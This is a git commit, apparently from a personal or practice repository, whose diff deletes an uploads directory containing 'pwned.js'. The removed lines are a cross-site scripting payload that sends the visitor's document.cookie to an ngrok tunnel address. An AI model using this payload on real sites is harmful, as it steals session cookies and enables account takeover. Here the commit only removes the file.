2c7c1525fea70e91f5b4685c33fda92673e6f27c
Aitor <69603173+aitortxu20@users.noreply.github.com>
2024-02-04 13:30:10 +0100

    Delete uploads directory

--- uploads/pwned.js
+++
@@ -1,4 +0,0 @@
-var request = new XMLHttpRequest();
-request.open('GET', 'https://eb49-90-173-214-195.ngrok-free.app/?cookie=' + document.cookie);
-request.send();
-//document.write("AFDASFASDFASFas")
